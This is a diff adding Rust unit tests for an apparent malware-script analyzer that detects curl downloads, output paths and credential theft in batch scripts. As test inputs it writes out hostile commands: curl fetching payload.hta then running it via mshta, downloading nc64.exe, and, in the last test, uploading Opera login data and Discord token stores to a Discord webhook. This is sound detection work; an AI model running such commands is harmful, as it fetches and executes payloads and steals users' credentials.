@@ -10262,6 +10262,70 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_config_file_multiple_urls_emit_structured_downloads() {
+        let report = analyze(
+            br#"echo url = "https://curl-config-multi.example/a.exe"> curl.cfg
+echo url = "https://curl-config-multi.example/b.exe">> curl.cfg
+curl -K curl.cfg
+"#,
+            &Config::default(),
+        );
+
+        for expected in [
+            "https://curl-config-multi.example/a.exe",
+            "https://curl-config-multi.example/b.exe",
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Download { src, dst, .. } if src == expected && dst.is_none()
+                )),
+                "curl config multi-URL source {expected} not structured: {:?}\n{}",
+                report.traits,
+                report.deobfuscated
+            );
+        }
+        let generic_count = report
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src.contains("curl-config-multi.example")
+                )
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "curl config multi-URL left generic duplicates: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn curl_stdin_config_from_type_pipeline_reads_url_and_output() {
+        let report = analyze(
+            br#"echo url = "https://curl-stdin-config.example/payload.exe">curl.cfg
+echo output = "payload.exe">>curl.cfg
+type curl.cfg | curl -K -"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-stdin-config.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "curl stdin config did not emit structured download: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn curl_with_output_equals_records_download_destination() {
         let mut env = Environment::new(&Config::default());
         interpret_line("curl --output=out.exe http://x/y.exe", &mut env);
@@ -10270,6 +10334,32 @@ mod curl_tests {
         ));
         assert!(has, "traits: {:?}", env.traits);
         assert!(env.modified_filesystem.contains_key("out.exe"));
+    }
+
+    #[test]
+    fn curl_output_equals_records_destination() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl --output=C:\Temp\payload.bin https://curl-output.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-output.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -10317,6 +10407,32 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_short_o_glued_records_destination() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -oC:\Temp\payload.bin https://curl-short-o.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-short-o.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_with_combined_short_output_flag_records_download_destination() {
         let mut env = Environment::new(&Config::default());
         interpret_line("curl -sLo out.exe http://x/y.exe", &mut env);
@@ -10325,6 +10441,32 @@ mod curl_tests {
         ));
         assert!(has, "traits: {:?}", env.traits);
         assert!(env.modified_filesystem.contains_key("out.exe"));
+    }
+
+    #[test]
+    fn curl_short_option_cluster_records_destination() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -fsSLo C:\Temp\payload.bin https://curl-cluster.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-cluster.example/payload.bin",
+                Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -10375,6 +10517,35 @@ mshta payload.hta"#,
     }
 
     #[test]
+    fn curl_short_option_cluster_remote_name_uses_basename_for_later_execution() {
+        let report = analyze(
+            br#"curl -LO https://curl-cluster-remote-name.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://curl-cluster-remote-name.example/payload.hta"
+                        && dst == "payload.hta"
+            )),
+            "curl -LO did not record remote-name destination: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://curl-cluster-remote-name.example/payload.hta"
+            )),
+            "mshta local HTA did not resolve curl -LO download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn curl_compact_remote_name_flag_uses_basename() {
         let mut env = Environment::new(&Config::default());
         interpret_line("curl -LO http://x/foo.exe", &mut env);
@@ -10406,6 +10577,35 @@ mshta payload.hta"#,
         assert!(env
             .modified_filesystem
             .contains_key("c:\\temp\\payload.bin"));
+    }
+
+    #[test]
+    fn curl_remote_name_with_output_dir_tracks_joined_destination_for_later_execution() {
+        let report = analyze(
+            br#"curl --output-dir C:\Temp -O https://curl-output-dir-mshta.example/payload.hta
+mshta payload.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://curl-output-dir-mshta.example/payload.hta"
+                        && dst == r#"C:\Temp\payload.hta"#
+            )),
+            "curl output-dir remote-name did not record joined destination: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta payload.hta"
+                        && url == "https://curl-output-dir-mshta.example/payload.hta"
+            )),
+            "mshta local HTA did not resolve curl output-dir download source: {:?}",
+            report.traits
+        );
     }
 
     #[test]
@@ -10596,6 +10796,68 @@ mshta C:/Temp/payload.hta"#,
     }
 
     #[test]
+    fn curl_multiple_direct_urls_emit_structured_downloads() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl https://curl-multi.example/a.exe https://curl-multi.example/b.exe"#,
+            &mut env,
+        );
+
+        for expected in [
+            "https://curl-multi.example/a.exe",
+            "https://curl-multi.example/b.exe",
+        ] {
+            assert!(
+                env.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Download { src, dst, .. } if src == expected && dst.is_none()
+                )),
+                "curl multi-URL source {expected} not structured: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn curl_multiple_urls_in_deob_text_emit_structured_downloads() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl https://curl-multi-deob.example/a.exe https://curl-multi-deob.example/b.exe"#,
+            &mut env,
+        );
+
+        for expected in [
+            "https://curl-multi-deob.example/a.exe",
+            "https://curl-multi-deob.example/b.exe",
+        ] {
+            assert!(
+                env.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Download { src, dst, .. } if src == expected && dst.is_none()
+                )),
+                "curl deob-text multi-URL source {expected} not structured: {:?}",
+                env.traits
+            );
+        }
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src.contains("curl-multi-deob.example")
+                )
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "curl multi-URL deob text left generic duplicates: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_with_url_equals_records_src() {
         let mut env = Environment::new(&Config::default());
         interpret_line("curl --url=http://x/y.exe", &mut env);
@@ -10605,6 +10867,29 @@ mshta C:/Temp/payload.hta"#,
             )
         });
         assert!(has, "traits: {:?}", env.traits);
+    }
+
+    #[test]
+    fn curl_url_equals_records_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl --url=https://curl-url.example/payload.bin --output out.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![("https://curl-url.example/payload.bin", Some("out.bin"))],
+            "traits: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -10627,6 +10912,32 @@ mshta C:/Temp/payload.hta"#,
             vec![(
                 "https://curl-separated-url.example/payload.bin",
                 Some(r#"C:\Temp\payload.bin"#)
+            )],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn curl_spaced_long_output_option_is_case_insensitive() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl --OUTPUT C:\Temp\upper-spaced.bin https://curl-upper-spaced-output.example/payload.bin"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![(
+                "https://curl-upper-spaced-output.example/payload.bin",
+                Some(r#"C:\Temp\upper-spaced.bin"#)
             )],
             "traits: {:?}",
             env.traits
@@ -10691,6 +11002,83 @@ mshta C:/Temp/payload.hta"#,
             vec![("https://discord.com/api/webhooks/abc", Some("NUL"))],
             "traits: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn curl_preserves_single_percent_variable_url_template() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"curl -s "https://ipinfo.io/%IP_ADDRESS%/json""#, &mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://ipinfo.io/%IP_ADDRESS%/json"
+            )),
+            "direct curl URL template was not preserved as a download: {:?}",
+            env.traits
+        );
+
+        let report = analyze(
+            br#"set /p IP_ADDRESS=Enter:
+curl -s "https://ipinfo.io/%IP_ADDRESS%/json" > ipinfo.json
+"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://ipinfo.io/%IP_ADDRESS%/json"
+            )),
+            "curl URL template was not preserved as a download: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn curl_filters_double_percent_loop_variable_url_template() {
+        let report = analyze(
+            br#"curl -o nc64.exe http://%%B/win/nc64.exe
+"#,
+            &Config::default(),
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://%%B/win/nc64.exe"
+            )),
+            "double-percent loop URL leaked as a download: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn curl_uploads_of_browser_and_discord_stores_emit_credential_access_traits() {
+        let script = br#"curl --silent --output /dev/null -F l=@"C:\Users\puncher\AppData\Roaming\Opera Software\Opera Stable\Login Data" https://discord.com/api/webhooks/1/token
+curl --silent --output /dev/null -F level=@"C:\Users\puncher\AppData\Roaming\discord\Local Storage\leveldb\%%f" https://discord.com/api/webhooks/1/token
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CredentialAccess { technique, target }
+                    if technique == "browser-cred-path"
+                        && target.contains(r"Opera Software\Opera Stable\Login Data")
+            )),
+            "Opera credential upload path was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CredentialAccess { technique, target }
+                    if technique == "discord-token-store"
+                        && target.contains(r"discord\Local Storage\leveldb\%%f")
+            )),
+            "Discord token store upload path was not surfaced: {:?}",
+            report.traits
         );
     }
 
